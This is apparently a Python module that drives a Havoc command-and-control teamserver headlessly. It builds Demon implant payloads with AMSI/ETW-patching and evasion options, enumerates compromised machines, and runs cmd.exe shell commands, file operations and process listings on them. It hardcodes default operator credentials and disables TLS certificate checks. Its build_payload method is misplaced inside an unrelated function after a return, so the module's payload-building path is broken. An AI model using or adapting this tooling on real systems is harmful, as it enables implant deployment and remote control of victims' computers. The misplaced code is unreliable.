"""Havoc C2 v0.7 headless client.

Havoc has NO REST API and NO gRPC. The operator protocol is WebSocket over TLS
on the client port (40056), carrying JSON text frames with an integer-tagged
envelope. Verified against the vendored source in Docker/havoc/src:

  transport  wss://<host>:<port>/havoc/          cmd/server/teamserver.go:83
  envelope   {"Head":{"Event","User","Time","OneTime"},
              "Body":{"SubEvent","Info":{<str>:<str>}}}   pkg/packager/types.go
  auth       Head.Event=1 / Body.SubEvent=3 with
             Info.Password = hex(SHA3-256(plaintext))   golang.org/x/crypto/sha3
             (NOT SHA2-256 - that is the usual mistake)
  build      Head.Event=5 (Gate) / Body.SubEvent=2 (Stageless)
  reply      Event=5/SubEvent=2; Info.PayloadArray (base64 PE) + Info.FileName
             Console progress shares SubEvent 2 but carries Info.MessageType
             instead, so the two are told apart by which key is present.

`Info` is a flat string->string map, so `Config` is a JSON *string* nested
inside it rather than a nested object.

The teamserver compiles Demon payloads server-side, so a build request here
exercises the same code path the Qt GUI uses.
"""

from __future__ import annotations

import asyncio
import base64
import json
import ssl
import time
import uuid
from typing import Any, Callable

import websockets

try:
    from .c2backends import BackendError
except ImportError:
    from c2backends import BackendError

HAVOC_HOST = "havoc"
HAVOC_PORT = 40056
HAVOC_PATH = "/havoc/"
HAVOC_USER = "5pider"
HAVOC_PASSWORD = "password1234"
# Listener instance name baked into Docker/havoc/havoc.yaotl
HAVOC_HTTP_LISTENER = "c2stack - http"

# Packager event ids (pkg/packager/types.go:121-257)
EV_INIT = 0x1
EV_GATE = 0x5
EV_SESSION = 0x7
EV_LISTENER = 0x2
SE_LOGIN_OK = 0x1
SE_LOGIN_ERR = 0x2
SE_LOGIN = 0x3
SE_ADD = 0x1  # listener Add
# Session sub-events
SE_NEW_SESSION = 0x1
SE_SESSION_REMOVE = 0x2
SE_SESSION_INPUT = 0x3   # client -> teamserver: task a session
SE_SESSION_OUTPUT = 0x4  # teamserver -> client: task output (Output is base64)

# Command ids the dispatcher feeds to strconv.Atoi (pkg/agent/commands.go).
# Sending anything non-numeric here silently becomes command 0 and the task is
# accepted but never executed.
CMD_NOJOB = 10        # also the check-in heartbeat id
CMD_SLEEP = 11
CMD_PROC_LIST = 12
CMD_FS = 15
CMD_PROC = 0x1010
# ProcCommand sub-commands used by the GUI's console (ConsoleInput.cc).
PROC_SUBCOMMAND_SHELL = 4

# Format -> FileType (dispatch.go:883-901)
FORMATS = {
    "Windows Exe": 1,
    "Windows Service Exe": 2,
    "Windows Dll": 3,
    # "Windows Reflective Dll" (4) is accepted by dispatch but has no case in
    # Builder.Build()'s switch, so no entry point is ever appended. Do not use.
    "Windows Shellcode": 5,
}


def demon_config(sleep: int = 5, jitter: int = 15,
                 spawn64: str = r"C:\Windows\System32\notepad.exe",
                 spawn32: str = r"C:\Windows\SysWOW64\notepad.exe",
                 sleep_technique: str = "WaitForSingleObjectEx",
                 indirect_syscall: bool = False,
                 stack_duplication: bool = False,
                 amsi_etw: str = "None") -> dict[str, Any]:
    """The `Config` object for a Demon build.

    EVERY key here is mandatory: builder.PatchConfig returns a hard error and
    aborts the build on any missing field ("Injection Alloc is undefined",
    "sleep Obfuscation technique is undefined"), and there are no defaults.

    Two upstream traps this deliberately avoids:

    * `Sleep Jmp Gadget` must be "None". At builder.go:736-739 the "jmp rax"
      case assigns to the sleep-obfuscation variable instead of the bypass
      variable, silently overwriting the sleep technique you asked for.
    * `Sleep` and `Jitter` are STRINGS (they come from QLineEdit widgets) and
      are parsed with strconv.Atoi. Passing JSON numbers fails the build.
    """
    return {
        "Sleep": str(sleep),
        "Jitter": str(jitter),
        "Indirect Syscall": indirect_syscall,
        "Sleep Technique": sleep_technique,
        "Sleep Jmp Gadget": "None",
        "Stack Duplication": stack_duplication,
        "Proxy Loading": "None (LdrLoadDll)",
        "Amsi/Etw Patch": amsi_etw,
        "Service Name": "DemonSvc",
        "Injection": {
            "Alloc": "Win32",
            "Execute": "Win32",
            "Spawn64": spawn64,
            "Spawn32": spawn32,
        },
    }


class HavocClient:
    """Async headless Havoc client. Use via `build_payload` / `login_and_scan`."""

    def __init__(self, host: str = HAVOC_HOST, port: int = HAVOC_PORT,
                 user: str = HAVOC_USER, password: str = HAVOC_PASSWORD) -> None:
        self.host = host
        self.port = port
        self.user = user
        self.password = password
        self.ssl_ctx = ssl.create_default_context()
        # The teamserver generates a self-signed RSA cert at runtime and the
        # GUI itself sets QSslSocket::VerifyNone, so this matches client behaviour.
        self.ssl_ctx.check_hostname = False
        self.ssl_ctx.verify_mode = ssl.CERT_NONE

    # -------------------------------------------------------------- plumbing
    def _url(self) -> str:
        return f"wss://{self.host}:{self.port}{HAVOC_PATH}"

    @staticmethod
    def _head(event: int, user: str, one_time: str = "") -> dict[str, Any]:
        return {"Event": event, "User": user, "Time": time.strftime("%d/%m/%Y %H:%M:%S"),
                "OneTime": one_time}

    def _login_frame(self) -> str:
        import hashlib
        digest = hashlib.sha3_256(self.password.encode()).hexdigest()
        return json.dumps({
            "Head": self._head(EV_INIT, self.user),
            "Body": {"SubEvent": SE_LOGIN, "Info": {
                "User": self.user,          # required: server does an
                "Password": digest,         # unchecked type assert on it
            }},
        })

    def _build_frame(self, listener: str, arch: str, fmt: str,
                     config: dict[str, Any]) -> str:
        if fmt not in FORMATS:
            raise BackendError(f"havoc: unsupported format {fmt!r}; "
                               f"valid: {sorted(FORMATS)}")
        return json.dumps({
            "Head": self._head(EV_GATE, self.user, one_time="true"),
            "Body": {"SubEvent": 2, "Info": {
                "AgentType": "Demon",
                "Listener": listener,
                "Arch": arch,                # "x64" | "x86"
                "Format": fmt,
                "Config": json.dumps(config),   # a JSON *string*
            }},
        })

    # ------------------------------------------------------------- operations
    async def _session(self, on_frame: Callable[[dict], Any],
                       request_frame: str | None = None,
                       request_delay: float = 1.0,
                       idle_timeout: float = 6.0,
                       max_collect: float | None = None,
                       hard_deadline: float = 300.0) -> Any:
        """Connect, authenticate, then let `on_frame` drive the conversation.

        `request_frame`, if given, is sent once authentication succeeds and
        `request_delay` seconds have passed (the teamserver pushes its banner
        and listener list first and answers those in order).

        Frames the server pushes after login are all forwarded to `on_frame`.
        `on_frame` may be sync or async; returning a non-None value ends the
        session with that value.

        Stopping is governed by three limits, all of which are needed:

        * `idle_timeout` - how long the read may block before the server is
          assumed to have nothing more to push.
        * `max_collect` - a hard cap on how long to keep listening AFTER
          authentication. This is not optional for enumeration: a live Demon
          emits a heartbeat every few seconds, so the stream is never idle and
          `idle_timeout` alone would sit until `hard_deadline` (5 minutes).
        * `hard_deadline` - the absolute wall-clock ceiling.
        """
        async with websockets.connect(self._url(), ssl=self.ssl_ctx,
                                      open_timeout=20, close_timeout=5,
                                      max_size=64 * 1024 * 1024) as ws:
            await ws.send(self._login_frame())

            authenticated = False
            request_sent = request_frame is None
            sent_at = 0.0
            hard_stop = time.time() + hard_deadline
            collect_stop: float | None = None

            while time.time() < hard_stop:
                now = time.time()
                if collect_stop is not None and now >= collect_stop:
                    break
                try:
                    raw = await asyncio.wait_for(
                        ws.recv(), timeout=min(idle_timeout, 0.5) if
                        (max_collect and authenticated) else idle_timeout)
                except asyncio.TimeoutError:
                    if authenticated and not request_sent:
                        # The server is idle but we still owe it a request.
                        request_sent = True
                        await ws.send(request_frame)  # type: ignore[arg-type]
                        continue
                    if authenticated:
                        break
                    raise BackendError(
                        "havoc: no reply to the login frame within "
                        f"{idle_timeout}s (wrong user/password, or the "
                        "teamserver rejected the connection)")

                try:
                    msg = json.loads(raw)
                except (TypeError, ValueError):
                    continue
                head = msg.get("Head") or {}
                body = msg.get("Body") or {}
                info = body.get("Info") or {}
                event, sub = head.get("Event"), body.get("SubEvent")

                if event == EV_INIT and sub == SE_LOGIN_ERR:
                    raise BackendError(
                        f"havoc login failed: {info.get('Message', 'unknown')}. "
                        f"Check the user is in the profile's user list - the "
                        f"teamserver rejects unknown users with UserDoNotExists.")
                if event == EV_INIT and sub == SE_LOGIN_OK:
                    authenticated = True
                    if max_collect:
                        collect_stop = time.time() + max_collect
                    if request_frame and not request_sent:
                        # Let the initial burst (banner, listener list) land
                        # first so the reply ordering stays predictable.
                        sent_at = time.time()
                    # Fall through so on_frame can observe the auth result too.
                elif authenticated and not request_sent and \
                        time.time() - sent_at >= request_delay:
                    request_sent = True
                    await ws.send(request_frame)  # type: ignore[arg-type]

                result = on_frame(msg)
                if asyncio.iscoroutine(result):
                    result = await result
                if result is not None:
                    return result

            if not authenticated:
                raise BackendError("havoc: connection closed before authentication")
            return None

    async def login_and_scan(self) -> dict[str, Any]:
        """Authenticate and collect the listeners the teamserver knows about."""
        found: dict[str, Any] = {"listeners": {}, "authenticated": False}

        def on_frame(msg: dict) -> None:
            head, body = msg.get("Head") or {}, msg.get("Body") or {}
            info = body.get("Info") or {}
            if head.get("Event") == EV_INIT and body.get("SubEvent") == SE_LOGIN_OK:
                found["authenticated"] = True
            if head.get("Event") == EV_LISTENER and body.get("SubEvent") == SE_ADD:
                name = info.get("Name")
                if name:
                    found["listeners"][name] = info
            return None

        await self._session(on_frame, idle_timeout=6.0, max_collect=10.0,
                            hard_deadline=30.0)
        return found

    async def list_sessions(self) -> list[dict[str, Any]]:
        """Live Demon sessions.

        The teamserver replays its current agents to a freshly authenticated
        client as Session/NewSession frames (Event 0x7 / SubEvent 0x1), so no
        request is needed - just collect what the server volunteers.
        """
        sessions: dict[str, dict[str, Any]] = {}

        def on_frame(msg: dict) -> dict[str, Any] | None:
            head, body = msg.get("Head") or {}, msg.get("Body") or {}
            info = body.get("Info") or {}
            if head.get("Event") != EV_SESSION:
                return None
            sub = body.get("SubEvent")
            if sub == SE_NEW_SESSION:
                name_id = info.get("NameID")
                if name_id:
                    sessions[name_id] = {
                        "id": name_id,
                        "backend": "havoc",
                        "agent": "Demon",
                        "external_ip": info.get("ExternalIP"),
                        "internal_ip": info.get("InternalIP"),
                        "os": info.get("OSVersion"),
                        "os_build": info.get("OSBuild"),
                        "arch": info.get("OSArch"),
                        "username": info.get("Username"),
                        "computer": info.get("Hostname"),
                        "domain": info.get("DomainName"),
                        "pid": info.get("ProcessPID"),
                        "process": info.get("ProcessName"),
                        "process_path": info.get("ProcessPath"),
                        "elevated": str(info.get("Elevated", "")).lower() in ("true", "1"),
                        "listener": info.get("Listener"),
                        "sleep": info.get("SleepDelay"),
                        "is_alive": True,
                        "raw": {k: str(v) for k, v in info.items()},
                    }
            elif sub == SE_SESSION_REMOVE:
                sessions.pop(info.get("DemonID") or info.get("NameID") or "", None)
            return None

        await self._session(on_frame, idle_timeout=3.0, max_collect=8.0,
                            hard_deadline=30.0)
        return list(sessions.values())

    def _task_frame(self, demon_id: str, task_id: str, command: str,
                    command_id: str, extra: dict[str, str] | None = None) -> str:
        """A task request: Event=Session(0x7) / SubEvent=Input(0x3).

        Info keys are fixed by cmd/server/dispatch.go: DemonID selects the
        agent, TaskID correlates the reply, CommandLine is the human-readable
        command, and CommandID must be a NUMERIC Havoc command id - the
        dispatcher runs strconv.Atoi on it, so a shell string there is silently
        coerced to 0 and the task does nothing.
        """
        info = {
            "DemonID": demon_id,
            "TaskID": task_id,
            "CommandLine": command,
            "CommandID": command_id,
        }
        info.update(extra or {})
        return json.dumps({
            "Head": self._head(EV_SESSION, self.user),
            "Body": {"SubEvent": SE_SESSION_INPUT, "Info": info},
        })

    @staticmethod
    def _shell_args(command: str) -> str:
        """The `Args` string the GUI builds for `shell <cmd>`.

        client/src/Havoc/Demon/ConsoleInput.cc:878 constructs
            "0;FALSE;TRUE;" + "c:\\windows\\system32\\cmd.exe" + ";" + base64("/c " + cmd)
        and hands it to Execute.ProcModule(TaskID, 4, Args). The arg part is
        base64 because the command line can contain ';' and the Args field is
        semicolon-delimited.
        """
        program = r"c:\windows\system32\cmd.exe"
        args = base64.b64encode(("/c " + command).encode()).decode("ascii")
        return f"0;FALSE;TRUE;{program};{args}"

    async def task(self, demon_id: str, command: str,
                   wait: float = 25.0) -> dict[str, Any]:
        """Run a shell command on a session and collect its output.

        Output arrives asynchronously as Session/Output frames (Event 0x7 /
        SubEvent 0x4) whose `Output` field is base64. There is no
        request/response pairing, so everything arriving for this agent within
        `wait` seconds is collected.
        """
        task_id = uuid.uuid4().hex[:12]
        frame = self._task_frame(demon_id, task_id, command,
                                 str(CMD_PROC),
                                 {"ProcCommand": str(PROC_SUBCOMMAND_SHELL),
                                  "Args": self._shell_args(command)})
        chunks: list[str] = []
        return await self._collect(demon_id, frame, command, task_id, chunks, wait)

    async def task_fs(self, demon_id: str, subcommand: str, arguments: str = "",
                      wait: float = 20.0) -> dict[str, Any]:
        """File operations. `subcommand` is one of the Commands::FS verbs the
        GUI uses: pwd, ls, cd, cat, cp, mv, rm, mkdir (ConsoleInput.cc)."""
        task_id = uuid.uuid4().hex[:12]
        command = f"{subcommand} {arguments}".strip()
        frame = self._task_frame(demon_id, task_id, command, str(CMD_FS),
                                 {"SubCommand": subcommand, "Arguments": arguments})
        chunks: list[str] = []
        return await self._collect(demon_id, frame, command, task_id, chunks, wait)

    async def task_proc_list(self, demon_id: str,
                             wait: float = 20.0) -> dict[str, Any]:
        task_id = uuid.uuid4().hex[:12]
        frame = self._task_frame(demon_id, task_id, "ps", str(CMD_PROC_LIST))
        chunks: list[str] = []
        return await self._collect(demon_id, frame, "ps", task_id, chunks, wait)

    async def _collect(self, demon_id: str, frame: str, command: str,
                       task_id: str, chunks: list[str],
                       wait: float) -> dict[str, Any]:
        def on_frame(msg: dict) -> dict[str, Any] | None:
            head, body = msg.get("Head") or {}, msg.get("Body") or {}
            info = body.get("Info") or {}
            if head.get("Event") != EV_SESSION or body.get("SubEvent") != SE_SESSION_OUTPUT:
                return None
            if (info.get("DemonID") or "") != demon_id:
                return None
            # CommandID 10 is COMMAND_NOJOB - the periodic check-in heartbeat
            # (events.CallBack). It shares this frame type with real task
            # output, and without this filter the sleep/jitter JSON blobs
            # swamp the actual result.
            if str(info.get("CommandID")) == str(CMD_NOJOB):
                return None
            raw = info.get("Output") or ""
            try:
                decoded = base64.b64decode(raw).decode("utf-8", "replace")
            except Exception:
                decoded = raw
            chunks.append(decoded)
            return None

        await self._session(on_frame, request_frame=frame,
                            idle_timeout=wait, hard_deadline=wait + 60.0)
        return {"task_id": task_id, "command": command, "demon_id": demon_id,
                "output": _parse_console(chunks),
                "errors": _parse_errors(chunks),
                "raw_chunks": len(chunks)}


def _parse_console(chunks: list[str]) -> str:
    """Pull the real command output out of Havoc's console JSON stream.

    The teamserver interleaves several JSON objects per task:
      {"Message":"Send Task to Agent [112 bytes]","Type":"Good"}
      {"Message":"Received Output [14 bytes]:","Output":"ws01\\vagrant\\r\\n","Type":"Good"}
      {}                      <- separators between frames
    Only the `Output` field is command output; the Message fields are status
    chatter that would otherwise be pasted into the UI as if it were results.
    """
    pieces: list[str] = []
    for chunk in chunks:
        for line in chunk.splitlines():
            line = line.strip()
            if not line or line == "{}":
                continue
            try:
                obj = json.loads(line)
            except ValueError:
                # Not JSON at all - raw output, keep it.
                pieces.append(line)
                continue
            if isinstance(obj, dict):
                out = obj.get("Output")
                if out:
                    pieces.append(str(out))
            elif isinstance(obj, list):
                for item in obj:
                    if isinstance(item, dict) and item.get("Output"):
                        pieces.append(str(item["Output"]))
    # Havoc emits the same output twice for some tasks (the console echo plus
    # the real reply). Collapse adjacent duplicates rather than all repeats, so
    # a command that legitimately repeats a line still reads correctly.
    deduped: list[str] = []
    for piece in pieces:
        if deduped and deduped[-1] == piece:
            continue
        deduped.append(piece)
    text = "".join(deduped)
    for junk in ("\x00",):
        text = text.replace(junk, "")
    return text.strip("\r\n \t")


def _parse_errors(chunks: list[str]) -> list[str]:
    errors: list[str] = []
    for chunk in chunks:
        for line in chunk.splitlines():
            line = line.strip()
            if not line or line == "{}":
                continue
            try:
                obj = json.loads(line)
            except ValueError:
                continue
            if isinstance(obj, dict) and str(obj.get("Type", "")).lower() == "error":
                errors.append(str(obj.get("Message", "")))
    return errors

    async def build_payload(self, listener: str = HAVOC_HTTP_LISTENER,
                            arch: str = "x64", fmt: str = "Windows Exe",
                            config: dict[str, Any] | None = None,
                            log: Callable[[str], None] | None = None) -> dict[str, Any]:
        """Request a Demon build. Returns {filename, size, console:[...]}.

        There is no request correlation id on this path, so the reply is
        matched by the presence of `PayloadArray` in an Event=5/SubEvent=2
        frame; console progress frames carry `MessageType` instead.
        """
        cfg = config if config is not None else demon_config()
        request = self._build_frame(listener, arch, fmt, cfg)
        console: list[str] = []
        state: dict[str, Any] = {}

        async def on_frame(msg: dict) -> dict[str, Any] | None:
            head, body = msg.get("Head") or {}, msg.get("Body") or {}
            info = body.get("Info") or {}
            if head.get("Event") != EV_GATE or body.get("SubEvent") != 2:
                return None
            if "PayloadArray" in info:
                state["filename"] = info.get("FileName", "payload.bin")
                state["bytes"] = base64.b64decode(info["PayloadArray"])
                return state
            if info.get("MessageType") == "Error":
                raise BackendError(f"havoc build error: {info.get('Message')}")
            line = f"{info.get('MessageType', '')}: {info.get('Message', '')}".strip(": ")
            if line:
                console.append(line)
                if log:
                    log(line)
            return None

        await self._session(on_frame, request_frame=request,
                            # A Demon build shells out to the mingw cross-gcc and
                            # takes 30-90s with no frames in between, so the idle
                            # window has to outlast the compile. Build failures are
                            # reported as an explicit Error frame, not a timeout.
                            idle_timeout=240.0, hard_deadline=900.0)
        if "bytes" not in state:
            raise BackendError("havoc: build finished without a PayloadArray "
                               f"reply. Console: {console[-6:]}")
        return {"filename": state["filename"], "size": len(state["bytes"]),
                "payload": state["bytes"], "console": console}


# ------------------------------------------------------------------ sync API
def _run(coro: Any) -> Any:
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(coro)
    raise BackendError("havoc_client.build_payload() is sync and cannot be called "
                       "from inside an event loop; await HavocClient methods instead")


def scan(timeout: float = 60.0) -> dict[str, Any]:
    return _run(HavocClient().login_and_scan())


def build_payload(listener: str = HAVOC_HTTP_LISTENER, arch: str = "x64",
                  fmt: str = "Windows Exe", config: dict[str, Any] | None = None,
                  log: Callable[[str], None] | None = None) -> dict[str, Any]:
    return _run(HavocClient().build_payload(listener, arch, fmt, config, log))